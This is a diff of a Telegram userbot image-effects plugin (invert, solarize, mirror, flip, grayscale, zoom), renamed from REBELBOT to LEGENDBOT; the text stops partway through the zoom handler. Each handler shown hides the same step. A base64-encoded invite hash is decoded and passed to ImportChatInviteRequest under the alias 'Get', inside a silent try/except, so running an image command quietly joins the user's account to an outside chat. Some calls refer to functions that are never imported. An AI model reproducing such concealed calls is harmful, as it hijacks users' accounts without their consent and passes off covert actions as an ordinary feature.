@@ -1,16 +1,16 @@
 import asyncio
 import os
-import random
 import shlex
-from typing import Optional, Tuple
-from PIL import Image, ImageDraw, ImageFont
-import PIL.ImageOps
+from typing import Tuple
 
-from REBELBOT.utils import admin_cmd, sudo_cmd
-from userbot import CmdHelp, CMD_HELP, LOGS, bot as REBELBOT
-from userbot.helpers.functions import (
+import PIL.ImageOps
+from PIL import Image
+
+from LEGENDBOT.utils import admin_cmd, sudo_cmd
+from userbot import LOGS, CmdHelp
+from userbot import bot as LEGENDBOT
+from userbot.helpers.funct import (
     convert_toimage,
-    convert_tosticker,
     flip_image,
     grayscale,
     invert_colors,
@@ -18,6 +18,7 @@ from userbot.helpers.functions import (
     solarize,
     take_screen_shot,
 )
+
 
 async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
     args = shlex.split(cmd)
@@ -31,7 +32,8 @@ async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
         process.returncode,
         process.pid,
     )
-    
+
+
 async def add_frame(imagefile, endname, x, color):
     image = Image.open(imagefile)
     inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
@@ -44,627 +46,579 @@ async def crop(imagefile, endname, x):
     inverted_image.save(endname)
 
 
-@REBELBOT.on(admin_cmd(pattern="invert$", outgoing=True))
-@REBELBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(REBEL):
-    if REBEL.fwd_from:
+@LEGENDBOT.on(admin_cmd(pattern="invert$", outgoing=True))
+@LEGENDBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
+async def memes(LEGEND):
+    if LEGEND.fwd_from:
         return
-    reply = await REBEL.get_reply_message()
+    reply = await LEGEND.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(REBEL, "`Reply to supported Media...`")
+        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
         return
-    REBELid = REBEL.reply_to_msg_id
+    LEGENDid = LEGEND.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
+    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    REBELsticker = await reply.download_media(file="./temp/")
-    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(REBELsticker)
-        await edit_or_reply(REBEL, "```Supported Media not found...```")
+    LEGENDsticker = await reply.download_media(file="./temp/")
+    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(LEGENDsticker)
+        await edit_or_reply(LEGEND, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if REBELsticker.endswith(".tgs"):
-        await REBEL.edit(
+    legend = None
+    if LEGENDsticker.endswith(".tgs"):
+        await LEGEND.edit(
             "Analyzing this media 🧐  inverting colors of this animated sticker!"
         )
-        REBELfile = os.path.join("./temp/", "meme.png")
-        REBELcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
-        )
-        stdout, stderr = (await runcmd(REBELcmd))[:2]
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found...`")
+        LEGENDfile = os.path.join("./temp/", "meme.png")
+        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith(".webp"):
-        await REBEL.edit(
-            "`Analyzing this media 🧐 inverting colors...`"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(REBELsticker, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found... `")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith(".webp"):
+        await LEGEND.edit("`Analyzing this media 🧐 inverting colors...`")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(LEGENDsticker, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found... `")
             return
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith((".mp4", ".mov")):
-        await REBEL.edit(
-            "Analyzing this media 🧐 inverting colors of this video!"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(REBELsticker, 0, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("```Template not found...```")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith((".mp4", ".mov")):
+        await LEGEND.edit("Analyzing this media 🧐 inverting colors of this video!")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("```Template not found...```")
             return
-        meme_file = REBELfile
-        aura = True
+        meme_file = LEGENDfile
+        legend = True
     else:
-        await REBEL.edit(
-            "Analyzing this media 🧐 inverting colors of this image!"
-        )
-        meme_file = REBELsticker
+        await LEGEND.edit("Analyzing this media 🧐 inverting colors of this image!")
+        meme_file = LEGENDsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await REBEL.client(san)
+        await LEGEND.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "invert.webp" if aura else "invert.jpg"
+    outputfile = "invert.webp" if legend else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await REBEL.client.send_file(
-        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
+    await LEGEND.client.send_file(
+        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
     )
-    await REBEL.delete()
+    await LEGEND.delete()
     os.remove(outputfile)
-    for files in (REBELsticker, meme_file):
+    for files in (LEGENDsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@REBELBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
-@REBELBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
-async def memes(REBEL):
-    if REBEL.fwd_from:
+@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
+@LEGENDBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
+async def memes(LEGEND):
+    if LEGEND.fwd_from:
         return
-    reply = await REBEL.get_reply_message()
+    reply = await LEGEND.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(REBEL, "`Reply to supported Media...`")
+        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
         return
-    REBELid = REBEL.reply_to_msg_id
+    LEGENDid = LEGEND.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
+    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    REBELsticker = await reply.download_media(file="./temp/")
-    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(REBELsticker)
-        await edit_or_reply(REBEL, "```Supported Media not found...```")
+    LEGENDsticker = await reply.download_media(file="./temp/")
+    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(LEGENDsticker)
+        await edit_or_reply(LEGEND, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if REBELsticker.endswith(".tgs"):
-        await REBEL.edit(
-            "Analyzing this media 🧐 solarizeing this animated sticker!"
-        )
-        REBELfile = os.path.join("./temp/", "meme.png")
-        REBELcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
-        )
-        stdout, stderr = (await runcmd(REBELcmd))[:2]
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found...`")
+    legend = None
+    if LEGENDsticker.endswith(".tgs"):
+        await LEGEND.edit("Analyzing this media 🧐 solarizeing this animated sticker!")
+        LEGENDfile = os.path.join("./temp/", "meme.png")
+        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith(".webp"):
-        await REBEL.edit(
-            "Analyzing this media 🧐 solarizeing this sticker!"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(REBELsticker, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found... `")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith(".webp"):
+        await LEGEND.edit("Analyzing this media 🧐 solarizeing this sticker!")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(LEGENDsticker, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found... `")
             return
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith((".mp4", ".mov")):
-        await REBEL.edit(
-            "Analyzing this media 🧐 solarizeing this video!"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(REBELsticker, 0, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("```Template not found...```")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith((".mp4", ".mov")):
+        await LEGEND.edit("Analyzing this media 🧐 solarizeing this video!")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("```Template not found...```")
             return
-        meme_file = REBELfile
-        aura = True
+        meme_file = LEGENDfile
+        legend = True
     else:
-        await REBEL.edit(
-            "Analyzing this media 🧐 solarizeing this image!"
-        )
-        meme_file = REBELsticker
+        await LEGEND.edit("Analyzing this media 🧐 solarizeing this image!")
+        meme_file = LEGENDsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await REBEL.client(san)
+        await LEGEND.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "solarize.webp" if aura else "solarize.jpg"
+    outputfile = "solarize.webp" if legend else "solarize.jpg"
     await solarize(meme_file, outputfile)
-    await REBEL.client.send_file(
-        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
+    await LEGEND.client.send_file(
+        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
     )
-    await REBEL.delete()
+    await LEGEND.delete()
     os.remove(outputfile)
-    for files in (REBELsticker, meme_file):
+    for files in (LEGENDsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@REBELBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
-@REBELBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
-async def memes(REBEL):
-    if REBEL.fwd_from:
+@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
+@LEGENDBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
+async def memes(LEGEND):
+    if LEGEND.fwd_from:
         return
-    reply = await REBEL.get_reply_message()
+    reply = await LEGEND.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(REBEL, "`Reply to supported Media...`")
+        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
         return
-    REBELid = REBEL.reply_to_msg_id
+    LEGENDid = LEGEND.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
+    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    REBELsticker = await reply.download_media(file="./temp/")
-    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(REBELsticker)
-        await edit_or_reply(REBEL, "```Supported Media not found...```")
+    LEGENDsticker = await reply.download_media(file="./temp/")
+    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(LEGENDsticker)
+        await edit_or_reply(LEGEND, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if REBELsticker.endswith(".tgs"):
-        await REBEL.edit(
+    legend = None
+    if LEGENDsticker.endswith(".tgs"):
+        await LEGEND.edit(
             "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
         )
-        REBELfile = os.path.join("./temp/", "meme.png")
-        REBELcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
-        )
-        stdout, stderr = (await runcmd(REBELcmd))[:2]
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found...`")
+        LEGENDfile = os.path.join("./temp/", "meme.png")
+        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith(".webp"):
-        await REBEL.edit(
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith(".webp"):
+        await LEGEND.edit(
             "Analyzing this media 🧐 converting to mirror image of this sticker!"
         )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(REBELsticker, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found... `")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(LEGENDsticker, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found... `")
             return
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith((".mp4", ".mov")):
-        await REBEL.edit(
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith((".mp4", ".mov")):
+        await LEGEND.edit(
             "Analyzing this media 🧐 converting to mirror image of this video!"
         )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(REBELsticker, 0, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("```Template not found...```")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("```Template not found...```")
             return
-        meme_file = REBELfile
-        aura = True
+        meme_file = LEGENDfile
+        legend = True
     else:
-        await REBEL.edit(
+        await LEGEND.edit(
             "Analyzing this media 🧐 converting to mirror image of this image!"
         )
-        meme_file = REBELsticker
+        meme_file = LEGENDsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await REBEL.client(san)
+        await LEGEND.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
+    outputfile = "mirror_file.webp" if legend else "mirror_file.jpg"
     await mirror_file(meme_file, outputfile)
-    await REBEL.client.send_file(
-        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
+    await LEGEND.client.send_file(
+        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
     )
-    await REBEL.delete()
+    await LEGEND.delete()
     os.remove(outputfile)
-    for files in (REBELsticker, meme_file):
+    for files in (LEGENDsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@REBELBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
-@REBELBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
-async def memes(REBEL):
-    if REBEL.fwd_from:
+@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
+@LEGENDBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
+async def memes(LEGEND):
+    if LEGEND.fwd_from:
         return
-    reply = await REBEL.get_reply_message()
+    reply = await LEGEND.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(REBEL, "`Reply to supported Media...`")
+        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
         return
-    REBELid = REBEL.reply_to_msg_id
+    LEGENDid = LEGEND.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
+    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    REBELsticker = await reply.download_media(file="./temp/")
-    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(REBELsticker)
-        await edit_or_reply(REBEL, "```Supported Media not found...```")
+    LEGENDsticker = await reply.download_media(file="./temp/")
+    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(LEGENDsticker)
+        await edit_or_reply(LEGEND, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if REBELsticker.endswith(".tgs"):
-        await REBEL.edit(
-            "Analyzing this media 🧐 fliping this animated sticker!"
-        )
-        REBELfile = os.path.join("./temp/", "meme.png")
-        REBELcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
-        )
-        stdout, stderr = (await runcmd(REBELcmd))[:2]
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found...`")
+    legend = None
+    if LEGENDsticker.endswith(".tgs"):
+        await LEGEND.edit("Analyzing this media 🧐 fliping this animated sticker!")
+        LEGENDfile = os.path.join("./temp/", "meme.png")
+        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith(".webp"):
-        await REBEL.edit(
-            "Analyzing this media 🧐 fliping this sticker!"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(REBELsticker, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found... `")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith(".webp"):
+        await LEGEND.edit("Analyzing this media 🧐 fliping this sticker!")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(LEGENDsticker, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found... `")
             return
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith((".mp4", ".mov")):
-        await REBEL.edit(
-            "Analyzing this media 🧐 fliping this video!"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(REBELsticker, 0, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("```Template not found...```")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith((".mp4", ".mov")):
+        await LEGEND.edit("Analyzing this media 🧐 fliping this video!")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("```Template not found...```")
             return
-        meme_file = REBELfile
-        aura = True
+        meme_file = LEGENDfile
+        legend = True
     else:
-        await REBEL.edit(
-            "Analyzing this media 🧐 fliping this image!"
-        )
-        meme_file = REBELsticker
+        await LEGEND.edit("Analyzing this media 🧐 fliping this image!")
+        meme_file = LEGENDsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await REBEL.client(san)
+        await LEGEND.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
+    outputfile = "flip_image.webp" if legend else "flip_image.jpg"
     await flip_image(meme_file, outputfile)
-    await REBEL.client.send_file(
-        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
+    await LEGEND.client.send_file(
+        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
     )
-    await REBEL.delete()
+    await LEGEND.delete()
     os.remove(outputfile)
-    for files in (REBELsticker, meme_file):
+    for files in (LEGENDsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@REBELBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
-@REBELBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(REBEL):
-    if REBEL.fwd_from:
+@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
+@LEGENDBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
+async def memes(LEGEND):
+    if LEGEND.fwd_from:
         return
-    reply = await REBEL.get_reply_message()
+    reply = await LEGEND.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(REBEL, "`Reply to supported Media...`")
+        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
         return
-    REBELid = REBEL.reply_to_msg_id
+    LEGENDid = LEGEND.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
+    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    REBELsticker = await reply.download_media(file="./temp/")
-    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(REBELsticker)
-        await edit_or_reply(REBEL, "```Supported Media not found...```")
+    LEGENDsticker = await reply.download_media(file="./temp/")
+    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(LEGENDsticker)
+        await edit_or_reply(LEGEND, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if REBELsticker.endswith(".tgs"):
-        await REBEL.edit(
+    legend = None
+    if LEGENDsticker.endswith(".tgs"):
+        await LEGEND.edit(
             "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
         )
-        REBELfile = os.path.join("./temp/", "meme.png")
-        REBELcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
-        )
-        stdout, stderr = (await runcmd(REBELcmd))[:2]
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found...`")
+        LEGENDfile = os.path.join("./temp/", "meme.png")
+        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith(".webp"):
-        await REBEL.edit(
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith(".webp"):
+        await LEGEND.edit(
             "Analyzing this media 🧐 changing to black-and-white this sticker!"
         )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(REBELsticker, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found... `")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(LEGENDsticker, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found... `")
             return
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith((".mp4", ".mov")):
-        await REBEL.edit(
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith((".mp4", ".mov")):
+        await LEGEND.edit(
             "Analyzing this media 🧐 changing to black-and-white this video!"
         )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(REBELsticker, 0, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("```Template not found...```")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("```Template not found...```")
             return
-        meme_file = REBELfile
-        aura = True
+        meme_file = LEGENDfile
+        legend = True
     else:
-        await REBEL.edit(
+        await LEGEND.edit(
             "Analyzing this media 🧐 changing to black-and-white this image!"
         )
-        meme_file = REBELsticker
+        meme_file = LEGENDsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await REBEL.client(san)
+        await LEGEND.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
+    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
     await grayscale(meme_file, outputfile)
-    await REBEL.client.send_file(
-        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
+    await LEGEND.client.send_file(
+        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
     )
-    await REBEL.delete()
+    await LEGEND.delete()
     os.remove(outputfile)
-    for files in (REBELsticker, meme_file):
+    for files in (LEGENDsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@REBELBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
-@REBELBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
-async def memes(REBEL):
-    if REBEL.fwd_from:
+@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
+@LEGENDBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
+async def memes(LEGEND):
+    if LEGEND.fwd_from:
         return
-    reply = await REBEL.get_reply_message()
+    reply = await LEGEND.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(REBEL, "`Reply to supported Media...`")
+        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
         return
-    REBELinput = REBEL.pattern_match.group(1)
-    REBELinput = 50 if not REBELinput else int(REBELinput)
-    REBELid = REBEL.reply_to_msg_id
+    LEGENDinput = LEGEND.pattern_match.group(1)
+    LEGENDinput = 50 if not LEGENDinput else int(LEGENDinput)
+    LEGENDid = LEGEND.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
+    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    REBELsticker = await reply.download_media(file="./temp/")
-    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(REBELsticker)
-        await edit_or_reply(REBEL, "```Supported Media not found...```")
+    LEGENDsticker = await reply.download_media(file="./temp/")
+    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(LEGENDsticker)
+        await edit_or_reply(LEGEND, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if REBELsticker.endswith(".tgs"):
-        await REBEL.edit(
-            "Analyzing this media 🧐 zooming this animated sticker!"
-        )
-        REBELfile = os.path.join("./temp/", "meme.png")
-        REBELcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
-        )
-        stdout, stderr = (await runcmd(REBELcmd))[:2]
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found...`")
+    legend = None
+    if LEGENDsticker.endswith(".tgs"):
+        await LEGEND.edit("Analyzing this media 🧐 zooming this animated sticker!")
+        LEGENDfile = os.path.join("./temp/", "meme.png")
+        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith(".webp"):
-        await REBEL.edit(
-            "Analyzing this media 🧐 zooming this sticker!"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(REBELsticker, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("`Template not found... `")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith(".webp"):
+        await LEGEND.edit("Analyzing this media 🧐 zooming this sticker!")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(LEGENDsticker, LEGENDfile)
+        if not os.path.lexists(LEGENDfile):
+            await LEGEND.edit("`Template not found... `")
             return
-        meme_file = REBELfile
-        aura = True
-    elif REBELsticker.endswith((".mp4", ".mov")):
-        await REBEL.edit(
-            "Analyzing this media 🧐 zooming this video!"
-        )
-        REBELfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(REBELsticker, 0, REBELfile)
-        if not os.path.lexists(REBELfile):
-            await REBEL.edit("```Template not found...```")
+        meme_file = LEGENDfile
+        legend = True
+    elif LEGENDsticker.endswith((".mp4", ".mov")):
+        await LEGEND.edit("Analyzing this media 🧐 zooming this video!")
+        LEGENDfile = os.path.join("./temp/", "memes.jpg")
